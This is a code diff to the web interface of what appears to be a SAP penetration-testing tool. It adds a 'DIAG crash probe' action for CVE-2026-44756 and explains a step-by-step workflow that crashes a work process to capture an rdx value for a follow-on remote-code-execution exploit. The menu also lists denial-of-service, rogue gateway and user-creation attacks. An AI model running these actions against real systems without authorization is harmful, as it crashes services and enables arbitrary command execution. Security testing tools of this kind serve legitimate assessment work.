@@ -1265,6 +1265,7 @@ body {
       <div class="ctx-item" data-action="create_user_betrusted">&#128272; Create User (10KBLAZE Full Chain)</div>
       <div class="ctx-item" data-action="exploit_cve_44756_dos">&#9889; Trigger CVE-2026-44756 DoS (crashes ICM worker)</div>
       <div class="ctx-item" data-action="capture_cve_44756_bases">&#128270; Capture CVE-2026-44756 bases (recon-only, via OS-exec)</div>
+      <div class="ctx-item" data-action="exploit_cve_44756_diag_crash">&#9889; Trigger CVE-2026-44756 DIAG crash probe (for rdx capture)</div>
       <div class="ctx-item" data-action="exploit_cve_44756_diag_rce">&#9889; Trigger CVE-2026-44756 DIAG RCE (arbitrary command)</div>
       <div class="ctx-item" data-action="exploit_cve_58240_register">&#9889; Register Rogue ASCS Gateway (CVE-2026-58240)</div>
       <div class="ctx-item" data-action="exploit_cve_58240_unregister">&#128245; Unregister Rogue ASCS Gateway (cleanup)</div>
@@ -6009,6 +6010,11 @@ function showCtxMenu(e, sid) {
     // DIAG RCE requires a vulnerable verdict; recon-values are prompted
     // for or auto-captured at trigger time.
     'exploit_cve_44756_diag_rce':   hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
+    // Crash probe: only shown once the target is confirmed vulnerable.
+    // It's the step that unblocks the rdx-capture catch-22 — the RCE
+    // handler needs rdx, and this crash probe is what makes the WP die
+    // so find_rdx.py on the target can read rdx via ptrace.
+    'exploit_cve_44756_diag_crash': hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
     'exploit_cve_58240_register':   hasCve58240Check,      // need check to have flagged opcodes present
     'exploit_cve_58240_unregister': hasCve58240Registered, // only after we've actually registered
     'check_cve_6287':        isJavaStack,             // Java-only RECON check
@@ -6317,6 +6323,7 @@ function showCtxMenu(e, sid) {
     'exploit_cve_44756_dos':        'Run "Check CVE-2026-44756" first — no ICM port on record',
     'capture_cve_44756_bases':      'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
     'exploit_cve_44756_diag_rce':   'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
+    'exploit_cve_44756_diag_crash': 'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
     'exploit_cve_58240_register':   'Run "Check CVE-2026-58240" first — need a target where the opcode family is recognised',
     'exploit_cve_58240_unregister': 'Nothing to clean up — no rogue ASCS gateway has been registered from this session',
     'check_cve_6287':        'Only applicable to Java / double-stack systems',
@@ -6624,6 +6631,7 @@ function showCtxMenu(e, sid) {
     // patched or unchecked nodes just clutters the menu.
     'capture_cve_44756_bases':        !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
     'exploit_cve_44756_diag_rce':     !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
+    'exploit_cve_44756_diag_crash':   !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
     'exploit_cve_58240_register':     !hasCve58240Check,
     'exploit_cve_58240_unregister':   !hasCve58240Registered,
     'analyse_capabilities':       !isAbapStack,
@@ -8011,6 +8019,31 @@ async function ctxAction(action) {
       await api('POST', `node/${sid}/exploit_cve_2026_44756_dos`, {confirm: true});
       break;
     }
+    case 'exploit_cve_44756_diag_crash': {
+      const nn = (mapState.nodes || {})[sid];
+      if (!nn) { showToast('Node not found', 'warn'); break; }
+      const info =
+        '⚠️ DESTRUCTIVE — CVE-2026-44756 DIAG crash probe\n\n'
+        + 'This exists to unblock a chicken-and-egg problem: the DIAG '
+        + 'RCE handler needs an rdx value (session-buffer address), but '
+        + 'rdx can only be read from a work process the moment it '
+        + 'crashes.  So this action delivers a bug-C payload with a '
+        + 'DELIBERATELY-BAD saved return address (0x4142434445).  '
+        + 'One work process on ' + sid + ' crashes — SAP re-forks it '
+        + 'within seconds — but before it dies your find_rdx.py '
+        + 'helper on the target catches the crash and prints rdx.\n\n'
+        + 'BEFORE clicking OK: on the target, as ' + sid.toLowerCase()
+        + 'adm, run:\n'
+        + '    python3 tools/cve-2026-44756/find_rdx.py ' + sid + '\n\n'
+        + 'It will say "attached to N process(es) — deliver the DIAG '
+        + 'bug-C probe now".  THEN come back and click OK here.\n\n'
+        + '❌ DO NOT run against production systems.\n'
+        + '✅ Confirm ONLY if you have written authorization to test '
+        + sid + '.\n\nProceed?';
+      if (!confirm(info)) break;
+      await api('POST', `node/${sid}/exploit_cve_2026_44756_diag_crash_probe`, {confirm: true});
+      break;
+    }
     case 'capture_cve_44756_bases': {
       const nn = (mapState.nodes || {})[sid];
       if (!nn) { showToast('Node not found', 'warn'); break; }
@@ -8077,9 +8110,18 @@ async function ctxAction(action) {
         const v = prompt(
           'Session-buffer landing address rdx (hex) — REQUIRED.\n\n'
           + 'This value is per-instance and cannot be derived remotely without '
-          + 'a live ptrace attach.  Measure it once with:\n'
-          + '  tools/cve-2026-44756/find_rdx.py <wp_pid>\n'
-          + 'running on the target as <sid>adm (or root).\n\n'
+          + 'a live ptrace attach.  Two-step workflow:\n\n'
+          + '  1. On the target, as ' + sid.toLowerCase() + 'adm:\n'
+          + '        python3 tools/cve-2026-44756/find_rdx.py ' + sid + '\n'
+          + '     (attaches to every work process, waits for a crash)\n\n'
+          + '  2. Back in SAPMAP:  right-click → Exploitation →\n'
+          + '     "Trigger CVE-2026-44756 DIAG crash probe"\n'
+          + '     (sends a bug-C payload with a deliberately-bad RIP;\n'
+          + '     one WP crashes; find_rdx.py catches it and prints:\n'
+          + '        FIND_RDX_OK:pid=<pid> rdx=0x<hex> rip=<hex> sig=<n>)\n\n'
+          + '  3. Paste that rdx value here.\n\n'
+          + 'rdx stays valid for the SAP instance\'s lifetime, so you\n'
+          + 'only measure it once per target.\n\n'
           + 'Format: 0x7976338EC35D',
           '');
         if (v === null) break;
